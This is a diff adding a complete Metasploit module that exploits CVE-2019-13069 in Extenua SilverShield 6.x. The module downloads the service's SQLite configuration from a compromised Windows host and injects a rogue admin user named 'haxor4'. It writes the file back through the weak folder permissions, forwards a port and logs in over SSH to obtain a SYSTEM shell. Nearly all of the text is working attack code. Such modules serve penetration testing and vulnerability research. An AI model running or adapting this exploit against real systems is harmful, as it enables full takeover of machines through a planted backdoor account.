@@ -1,0 +1,343 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+# Exploit Title: extenua SilverSHielD 6.x local priviledge escalation
+# Google Dork: na
+# Date: 31 Jul 2019
+# Exploit Author: Ian Bredemeyer
+# Vendor Homepage: https://www.extenua.com
+# Software Link: https://www.extenua.com/silvershield
+# Version: 6.x
+# Tested on: Windows7 x64, Windows7 x86, Windows Server 2012 x64, Windows10 x64, Windows Server 2016 x64
+# CVE: CVE-2019-13069
+
+# More Info: https://www.fobz.net/adv/ag47ex/info.html
+
+require 'sqlite3'
+require 'net/ssh'
+require 'net/ssh/command_stream'
+require 'tempfile'
+require 'securerandom'
+require 'digest'
+
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = GoodRanking
+
+  include Post::File
+  include Msf::Exploit::Remote::SSH
+  include Msf::Post::Windows::Services
+  include Msf::Post::Windows::FileInfo
+
+  def initialize(info={})
+    super( update_info(info,
+      'Name'          => 'Extenua SilverSHielD 6.x local privilege escalation',
+      'Description'   => %q{
+        Extenua SilverShield 6.x fails to secure its ProgramData subfolder.
+        This module exploits this by injecting a new user into the database and then
+        using that user to login the SSH service and obtain SYSTEM. 
+        This results in to FULL SYSTEM COMPROMISE. 
+        At time of discolsure, no fix has been issued by vendor.
+      },
+      'Author'        => [
+        'Ian Bredemeyer',
+        ],
+      'Platform'      => [ 'win','unix' ],  # 'unix' is needed, otherwise the Payload is flagged as incompatible
+      'SessionTypes'  => [ 'meterpreter' ],
+      'Targets'       => [
+        [ 'Universal', {} ],
+      ],
+      'Payload'     =>
+        {
+          'Compat'  => {
+            'PayloadType'    => 'cmd_interact',
+            'ConnectionType' => 'find',
+          },
+        },
+      'DefaultTarget' => 0,
+      'References'    => [
+        [ 'CVE', '2019-13069' ],
+        [ 'URL', 'https://www.fobz.net/adv/ag47ex/info.html' ],
+        [ 'URL', 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13069' ]
+      ],
+      'DisclosureDate'=> "Jul 31 2019",
+      'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/interact' },
+    ))
+
+    register_options([
+      OptPort.new('PF_PORT', [ true, 'Local port to PortFwd to victim', 20022 ]),
+      OptString.new('SS_IP', [ false, 'IP address SilverShield is listening on at the victim. Leave blank to detect.', '' ]),
+      OptPort.new('SS_PORT', [ false, 'Port SilverShield is listening on at the victim.  Leave at 0 to detect.', 0 ]),
+      OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
+      OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 15])
+    ])
+  end
+
+  
+
+  # Grabbed this bit from another exploit I was pulling apart... Need to trick the SSH session a bit
+  module ItsAShell
+    def _check_shell(*args)
+      true
+    end
+  end
+  
+  
+  
+  # helper methods that normally come from Tcp
+  def rhost
+    return '127.0.0.1'
+  end
+  def rport
+    datastore['PF_PORT']
+  end
+
+  
+
+  # Does a basic check of SilverShield... Does not fail if there is a problem, but will return false
+  def do_check_internal()
+  
+    looks_ok = true    # lets assume everything is OK...
+  
+    # Try to get the path of the SilverShield service...
+    ss_serviceinfo = service_info("SilverShield")
+    ss_servicepath = ss_serviceinfo[:path]
+    if (ss_servicepath == '')
+        print_warning("Vulnerable Silvershield service is likely NOT running on the target system")
+        looks_ok = false
+    else
+        print_good("Silvershield service found: " + ss_servicepath)
+    end
+
+
+    # Try to read the version of Silvershield from the resigstry of the victim...
+    ss_version = ""
+    begin
+      ss_version = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SOFTWARE\\extenua\\SilverShield', KEY_READ).query_value("Version").data
+    rescue ::Exception => e
+      print_warning "Cannot find SilverShield version in registry.  Victim may not have vulnerable SilverShield installed"
+      looks_ok = false
+    end
+    if ss_version != ""
+      print_good("Silvershield version from registry: " + ss_version)
+      if ss_version[0..1] != "6."    # If not version "6." something ?  then this will not work...
+        print_warning("This version is not likely vulnerable to this module")
+        looks_ok = false
+      end      
+    end  
+    return looks_ok
+    
+  end
+  
+ 
+  
+  
+  # Attempts a single SSH login to the victim via the local port forwarded to fictim.  Returns valid connection if OK
+  def do_login()
+    factory = Rex::Socket::SSHFactory.new(framework,self, datastore['Proxies'])
+    opt_hash = {
+      :auth_methods    => ['password'],
+      :port            => rport,
+      :use_agent       => false,
+      :config          => false,
+      :proxy           => factory,
+      :password        => @@the_password,
+      :non_interactive => true,
+      :verify_host_key => :never
+    }
+    opt_hash.merge!(:verbose => :debug) if datastore['SSH_DEBUG']
+    begin
+      ssh_socket = nil
+      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
+        ssh_socket = Net::SSH.start(rhost, 'haxor4', opt_hash)
+      end
+    rescue Rex::ConnectionError
+      return
+    rescue Net::SSH::Disconnect, ::EOFError
+      print_error "#{rhost}:#{rport} SSH - Disconnected during negotiation"
+      return
+    rescue ::Timeout::Error
+      print_error "#{rhost}:#{rport} SSH - Timed out during negotiation"
+      return
+    rescue Net::SSH::AuthenticationFailed
+      print_error "#{rhost}:#{rport} SSH - Failed authentication"
+    rescue Net::SSH::Exception => e
+      print_error "#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}"
+      return
+    end
+
+    if ssh_socket
+      # Create a new session from the socket, then dump it.
+      conn = Net::SSH::CommandStream.new(ssh_socket)
+      ssh_socket = nil
+      return conn
+    else
+      return false
+    end
+  end
+
+  
+  
+  # Attempts several times to connect through session back to SilverShield as haxor then open resulting shell as a new session.
+  def exploit_sub
+    x = 0
+    while x < 5 do 
+        x = x + 1
+        print_status "SSH login attempt " + x.to_s + ".  May take a moment..."
+
+        conn = do_login()
+        if conn
+          print_good "Successful login.  Passing to handler..."
+          handler(conn.lsock)
+          return true
+        end
+    end     
+    return false
+  end
+
+
+  
+  def check()
+    if do_check_internal
+        Exploit::CheckCode::Appears
+    else
+        Exploit::CheckCode::Safe
+    end
+  end
+  
+  
+  
+  # The guts of it...
+  def exploit
+  
+    # Some basic setup...
+    payload_instance.extend(ItsAShell)
+    factory = ssh_socket_factory
+    
+    
+    # Do a quick check... well, sort of, just shows info.  We won't stop, just report to user...
+    do_check_internal()
+    
+    
+    # We will generate a NEW password and salt.  Then get the relevant hash to inject...
+    @@the_password = SecureRandom.hex
+    @@the_password_salt = SecureRandom.hex[0..7]
+    @@the_password_hash = Digest::MD5.hexdigest @@the_password_salt + @@the_password
+    vprint_status("generated- user:haxor4  password:" + @@the_password + " salt:" + @@the_password_salt + " => hash(md5):" + @@the_password_hash)
+
+
+    # Get a tempfile on the local system.  Garbage collection will automaticlly kill it off later...
+    # This is a temp location where we will put the sqlite database so we can work on it on the local machine...
+    tfilehandle = Tempfile.new('ss.db.')
+    tfilehandle.close
+    wfile = tfilehandle.path
+
+
+    #Try to get the ProgramData path from the victim, this is where the SQLite databasae is held...
+    progdata = session.fs.file.expand_path("%ProgramData%")    # client.sys.config.getenv('PROGRAMDATA')
+    print_status 'Remote %ProgramData% = ' + progdata
+
+
+    # Lets check the file exists, then download from the victim to the local file system...
+    filecheck = progdata + '\SilverShield\SilverShield.config.sqlite'
+    fsrc = filecheck
+    fdes = wfile  
+    print_status 'Try download: ' + fsrc + '  to: ' + fdes
+    begin
+      ::Timeout.timeout(5) do
+            session.fs.file.download_file(fdes, fsrc)
+      end
+    rescue ::Exception => e
+      print_error "Cannot download #{fsrc} to #{fdes}  #{e.class} : #{e.message}"
+      print_error "Does victim even have vulnerable SilverShield installed ?"
+      fail_with(Failure::Unknown, "Fail download")
+    end
+
+
+    # Try to connect with sqlite locally...
+    vprint_status 'Trying to open database ' + wfile
+    db = SQLite3::Database.open wfile
+
+
+    # Remove haxor4 if its already there, just incase by pure chance a user with that name already exists...
+    vprint_status 'remove user "haxor4" if its already in there...'
+    results = db.execute "delete from USERS where vcusername='haxor4'"
+    answer = ""
+    results.each { |row| answer = answer + row.join(',') }
+
+
+    # Insert the haxor user... we will use this later to connect back in as SYSTEM
+    vprint_status 'insert user "haxor4" with password "' + @@the_password + '" into database'
+    results = db.execute "INSERT INTO USERS (CUSERID, VCUSERNAME, CSALT,CPASSWORD, VCHOMEDIR, BGETFILE, BPUTFILE, BDELFILE, BMODFILE, BRENFILE, BLISTDIR, BMAKEDIR, BDELDIR, BRENDIR, IAUTHTYPES, BAUTHALL, BALLOWSSH, BALLOWSFTP, BALLOWFWD, BALLOWDAV, IACCOUNTSTATUS, BAUTODISABLE, DTAUTODISABLE, BWINPASSWD, BISADMIN)VALUES(\"{11112222-3333-4444-5555666677778888}\",\"haxor4\",\"" + @@the_password_salt + "\",\"" + @@the_password_hash + "\",\"c:\\\",1,1,1,1,1,1,1,1,1,20,0,1,0,0,0,0,0,-700000.0, 0, 1);"
+    answer = ""
+    results.each { |row| answer = answer + row.join(',') }
+    print_good 'user inserted OK'
+
+
+    # Dump out local port that SilverShield has been configured to listen on at the victim machine...
+    results = db.execute "select IPORT from maincfg"
+    answer = ""
+    results.each { |row| answer = answer + row.join(',') }
+    ss_port = answer
+    print_status "SilverShield config shows listening on port: " + ss_port
+    if (datastore['SS_PORT'] != 0) 
+        ss_port = datastore['SS_PORT'].to_s
+        print_status "SS_PORT setting forcing port to " + ss_port
+    end
+    if (ss_port == '')
+        ss_port = '22'
+    end
+
+
+    # Dump out local IP that SilverShield has been configured to listen on at the victim machine...
+    results = db.execute "select CBINDIP from maincfg"
+    answer = ""
+    results.each { |row| answer = answer + row.join(',') }
+    ss_ip = answer
+    print_status "SilverShield config shows listening on local IP: " + ss_ip
+    if (datastore['SS_IP'] != '') 
+        ss_ip = datastore['SS_IP']
+        print_status "SS_IP setting forcing IP to " + ss_ip
+    end
+    # If the override AND the detection have come up with nothing, then use the default 127.0.0.1
+    if (ss_ip == '') 
+        ss_ip = '127.0.0.1'
+    end
+
+
+    # Close the database. Keep it neat
+    db.close
+
+
+    # Now lets upload this file back to the victim...due to bad folder permissions, we can sneak our bad config back in.  Yay
+    fdes = filecheck  
+    fsrc = wfile
+    print_status 'Sending modded file back to victim' 
+    begin
+      ::Timeout.timeout(5) do
+            session.fs.file.upload_file(fdes, fsrc)
+      end
+    rescue ::Exception => e
+      print_error "Cannot upload #{fsrc} to #{fdes}  #{e.class} : #{e.message}"
+      print_error "Perhaps this server is not vulnerable or has some other mitigation."
+      fail_with(Failure::Unknown, "Fail upload")
+    end
+    sleep 4   # wait a few seconds... this gives the SilverShield service some time to see the settings have changed.
+
+
+    # Delete the port if its already pointing somewhwere...  This a bit ugly and may generate an error, but I don't care.
+    client.run_cmd("portfwd delete -l " + datastore['PF_PORT'].to_s)
+
+
+    # Forward a local port through to the ssh port on the victim. 
+    client.run_cmd("portfwd add -l " + datastore['PF_PORT'].to_s + " -p " + ss_port + " -r " + ss_ip)
+
+
+    # Now do ssh work and hand off the session to the handler...
+    exploit_sub
+
+  end 
+
+end
